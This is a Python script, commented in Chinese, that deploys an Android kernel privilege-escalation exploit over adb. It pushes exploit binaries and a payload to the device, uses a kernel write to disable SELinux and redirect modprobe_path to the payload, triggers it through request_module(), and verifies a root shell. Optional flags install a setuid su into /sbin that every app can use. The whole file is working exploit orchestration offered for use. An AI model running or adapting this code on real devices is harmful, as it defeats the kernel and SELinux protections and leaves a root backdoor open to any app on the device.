#!/usr/bin/env python3
"""推送文件、跑利用、触发内核 payload、验证 root。

    python deploy.py
    python deploy.py --serial <serial>
    python deploy.py --allow-all
"""
import argparse
import os
import re
import subprocess
import sys
import time

ROOT = os.path.dirname(os.path.abspath(__file__))
D = "/data/local/tmp"


def adb(serial, *args, check=True, capture=False):
    """调用 adb，统一 UTF-8 解码。"""
    cmd = [os.environ.get("ADB", "adb")]
    if serial:
        cmd += ["-s", serial]
    cmd += list(args)
    return subprocess.run(cmd, check=check, text=True, encoding="utf-8", errors="replace",
                          stdout=subprocess.PIPE if capture else None,
                          stderr=subprocess.STDOUT if capture else None)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--serial", default=os.environ.get("SERIAL", ""))
    ap.add_argument("--allow-all", action="store_true",
                    help="成功后把 setuid su 装进 /sbin（受限 root）")
    ap.add_argument("--suclient", action="store_true",
                    help="成功后把客户端 su 装进 /sbin（完整 capability）")
    args = ap.parse_args()

    bindir = os.path.join(ROOT, "bin")
    if not os.path.isfile(os.path.join(bindir, "probe26")):
        print("[*] 先编译")
        subprocess.run([sys.executable, os.path.join(ROOT, "build.py")], check=True)

    adb(args.serial, "wait-for-device")

    print("[*] 推送文件")
    local = [os.path.join(bindir, b) for b in ["probe26", "trig_sock", "rootshell"]] + \
            [os.path.join(ROOT, "payload", "wb.sh")]
    adb(args.serial, "push", *local, D + "/", capture=True)
    # su 源文件按 .su.bin 推：/data 是 nosuid，真正可执行的副本由 payload 放到 tmpfs
    adb(args.serial, "push", os.path.join(bindir, "su"), D + "/.su.bin", capture=True)
    adb(args.serial, "shell", "rm -f " + f"{D}/su")
    adb(args.serial, "shell", "chmod 755 " + " ".join(
        f"{D}/{x}" for x in ["probe26", "trig_sock", "rootshell", "wb.sh", ".su.bin"]))

    print("[*] 第 1/3 步：内核写（selinux_enforcing=0，modprobe_path=payload）")
    out = adb(args.serial, "shell", f"{D}/probe26 -p {D}/wb.sh -L {D}/probe26.log -y -q",
              capture=True, check=False).stdout or ""
    with open(os.path.join(ROOT, ".last-run.log"), "w", encoding="utf-8") as f:
        f.write(out)
    for line in [l for l in out.splitlines() if l.strip()][-3:]:
        print("  " + line)
    if "result=OK" not in out:
        sys.exit("[!] 利用没有成功——看 " + D + "/probe26.log，重启后重试")

    print("[*] 第 2/3 步：触发 request_module() → root payload")
    adb(args.serial, "shell", f"{D}/trig_sock", check=False)
    time.sleep(1)

    print("[*] 第 3/3 步：验证")
    enf = adb(args.serial, "shell", "getenforce", capture=True, check=False).stdout or ""
    su = adb(args.serial, "shell", f"{D}/.su/su -c id", capture=True, check=False).stdout or ""
    rs = adb(args.serial, "shell", f"{D}/rootshell id", capture=True, check=False).stdout or ""
    ok = (enf.strip() == "Permissive"
          and bool(re.search(r"uid=0", su)) and bool(re.search(r"uid=0", rs)))
    print("  SELinux   ：", enf.strip())
    print("  su -c id  ：", su.strip().replace("\n", " | "))
    print("  socket shell：", rs.strip().replace("\n", " | "))

    if not ok:
        sys.exit("[!] 提权验证失败，见 docs/TROUBLESHOOTING.md")

    if args.allow_all:
        print("\n[*] 全放行：把 setuid su 装进 /sbin")
        sys.path.insert(0, ROOT)
        import allowall
        if not allowall.install(args.serial):
            sys.exit("[!] 全放行失败，见 docs/TROUBLESHOOTING.md")

    if args.suclient:
        print("\n[*] 客户端 su：把 rootshell 装进 /sbin")
        sys.path.insert(0, ROOT)
        import suclient
        if not suclient.install(args.serial):
            sys.exit("[!] 客户端 su 安装失败，见 docs/TROUBLESHOOTING.md")

    print("\n[+] 完成。交互式 root shell：")
    print(f"      adb {('-s ' + args.serial + ' ') if args.serial else ''}shell {D}/rootshell")
    if args.allow_all or args.suclient:
        print("    或者 su（已装进 /sbin，所有应用可用）：")
        print(f"      adb {('-s ' + args.serial + ' ') if args.serial else ''}shell su -c id")
    else:
        print("    或者 su（不在 PATH 里，未写 /system）：")
        print(f"      adb {('-s ' + args.serial + ' ') if args.serial else ''}shell {D}/.su/su")
        print(f"      adb {('-s ' + args.serial + ' ') if args.serial else ''}shell 'export PATH={D}/.su:$PATH; su'")
    print("\n[!] 仅本次开机有效：重启后 SELinux 恢复 Enforcing，modprobe_path 复原。")


if __name__ == "__main__":
    main()
